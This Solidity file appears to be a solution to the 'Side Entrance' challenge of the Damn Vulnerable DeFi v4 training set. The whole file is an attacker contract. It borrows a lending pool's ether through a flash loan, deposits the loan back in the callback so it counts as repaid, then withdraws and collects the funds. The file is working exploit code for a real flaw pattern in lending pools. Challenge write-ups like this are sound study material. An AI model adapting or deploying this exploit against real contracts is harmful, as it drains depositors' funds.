// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    uint256 constant ETHER_IN_POOL = 1000e18;

    constructor(address _pool) payable {
        pool = SideEntranceLenderPool(_pool);
        pool.deposit{value: address(this).balance}();
    }

    function attack() public {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
